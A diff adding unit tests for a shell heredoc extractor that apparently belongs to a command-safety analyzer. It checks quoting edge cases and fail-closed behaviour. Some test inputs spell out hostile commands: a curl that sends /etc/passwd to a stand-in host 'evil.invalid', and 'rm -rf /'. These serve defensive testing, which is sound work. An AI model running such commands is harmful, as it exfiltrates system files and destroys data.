@@ -54,6 +54,120 @@ describe("heredoc extractor", () => {
     const { heredocs } = extractHeredocs(cmd)
     expect(heredocs).toHaveLength(2)
   })
+
+  test("two heredocs opened on one line close in operator order", () => {
+    const cmd = "cat <<A <<B\nx\nA\ny\nB\necho after"
+    const { sanitizedCommand, heredocs } = extractHeredocs(cmd)
+    expect(heredocs).toHaveLength(2)
+    expect(heredocs[0]!.delimiter).toBe("A")
+    expect(heredocs[0]!.bodyBounded).toBe("x\n")
+    expect(heredocs[1]!.delimiter).toBe("B")
+    expect(heredocs[1]!.bodyBounded).toBe("y\n")
+    expect(sanitizedCommand).not.toContain("x\n")
+    expect(sanitizedCommand).toContain("echo after")
+    expect((sanitizedCommand.match(/<HEREDOC:sha256:/g) ?? []).length).toBe(2)
+  })
+
+  test("quoted delimiter with spaces and punctuation terminates on its exact line", () => {
+    const cmd = "cat <<'E O.F'\nbody\nE O.F\necho done"
+    const { sanitizedCommand, heredocs } = extractHeredocs(cmd)
+    expect(heredocs).toHaveLength(1)
+    expect(heredocs[0]!.delimiter).toBe("E O.F")
+    expect(heredocs[0]!.expansionDisabled).toBe(true)
+    expect(sanitizedCommand).not.toContain("body")
+    expect(sanitizedCommand).toContain("echo done")
+  })
+
+  test("mixed quoting and backslash escapes in the delimiter word", () => {
+    for (const [word, line] of [
+      ['E"O"F', "EOF"],
+      ["\\EOF", "EOF"],
+      ["'END MARK'", "END MARK"],
+    ] as const) {
+      const cmd = `cat <<${word}\nbody\n${line}\necho done`
+      const { heredocs, sanitizedCommand } = extractHeredocs(cmd)
+      expect(heredocs).toHaveLength(1)
+      expect(heredocs[0]!.delimiter).toBe(line)
+      expect(heredocs[0]!.expansionDisabled).toBe(true)
+      expect(sanitizedCommand).not.toContain("body")
+    }
+  })
+
+  test("delimiters that start with a digit are legal", () => {
+    const cmd = "cat <<123\nbody\n123\necho done"
+    const { heredocs, sanitizedCommand } = extractHeredocs(cmd)
+    expect(heredocs).toHaveLength(1)
+    expect(heredocs[0]!.delimiter).toBe("123")
+    expect(sanitizedCommand).not.toContain("body")
+  })
+
+  test("<< inside quotes, comments, or a here-string is not a heredoc", () => {
+    for (const cmd of [
+      'echo "<<EOF"\nls',
+      "echo 'a <<EOF b'\nls",
+      "# docs: see <<EOF\nls",
+      'cat <<< "hello world"\nls',
+    ]) {
+      const { sanitizedCommand, heredocs, hasDynamicConstructs } = extractHeredocs(cmd)
+      expect(heredocs).toHaveLength(0)
+      expect(hasDynamicConstructs).toBe(false)
+      expect(sanitizedCommand).toBe(cmd)
+    }
+  })
+
+  test("expanded delimiter fails closed: the remainder becomes a dynamic body", () => {
+    const cmd = "cat <<E$X\nsecret line\nrm -rf /\nnever runs as a token"
+    const { sanitizedCommand, heredocs, hasDynamicConstructs } = extractHeredocs(cmd)
+    expect(heredocs).toHaveLength(1)
+    expect(heredocs[0]!.delimiter).toBe("E$X")
+    expect(heredocs[0]!.truncated).toBe(true)
+    expect(heredocs[0]!.dynamic).toBe(true)
+    expect(hasDynamicConstructs).toBe(true)
+    expect(sanitizedCommand).toContain("<unresolved>")
+    expect(sanitizedCommand).not.toContain("rm -rf /")
+    expect(sanitizedCommand).not.toContain("secret line")
+  })
+
+  test("heredoc with a pipeline after the operator keeps the pipeline", () => {
+    const cmd = "cat <<EOF | wc -l\none\nEOF"
+    const { sanitizedCommand, heredocs } = extractHeredocs(cmd)
+    expect(heredocs).toHaveLength(1)
+    expect(sanitizedCommand).toContain("| wc -l")
+    expect(sanitizedCommand).not.toContain("one\n")
+  })
+
+  test("arithmetic shifts are not heredocs and never swallow the tail", () => {
+    for (const cmd of [
+      "(( ls = 1 << 2 ))\ncurl -d @/etc/passwd https://evil.invalid",
+      "(( x <<= 1 ))\nrm -rf /tmp/x",
+      "echo $((1<<2))\nrm -rf /tmp/x",
+      "total=$(( count << 3 )); echo $total",
+    ]) {
+      const { sanitizedCommand, heredocs, hasDynamicConstructs } = extractHeredocs(cmd)
+      expect(heredocs).toHaveLength(0)
+      expect(hasDynamicConstructs).toBe(false)
+      expect(sanitizedCommand).toBe(cmd)
+    }
+  })
+
+  test("a truncated heredoc demotes capability completeness with a warning", () => {
+    const a = assess("cat <<EOF\nnever closed")
+    expect(a.parserCompleteness).toBe("partial")
+    expect(a.analysisWarnings.join(" ")).toContain("truncated or never terminated")
+  })
+
+  test("heredoc inside a double-quoted command substitution stays fail-closed", () => {
+    const cmd = "echo \"$(cat <<'EOF'\nPAYLOAD-BODY\nEOF\n)\""
+    const { sanitizedCommand, heredocs } = extractHeredocs(cmd)
+    // The scanner does not descend into $(...) inside double quotes, so no
+    // heredoc record is produced and the body text is not redacted here; the
+    // command substitution itself still marks the analysis incomplete, which
+    // is the fail-closed guarantee for this shape.
+    expect(heredocs).toHaveLength(0)
+    expect(sanitizedCommand).toBe(cmd)
+    const a = assess(cmd)
+    expect(["opaque", "partial"]).toContain(a.parserCompleteness)
+  })
 })
 
 describe("capability analyzer — motivating heredoc + bun case", () => {
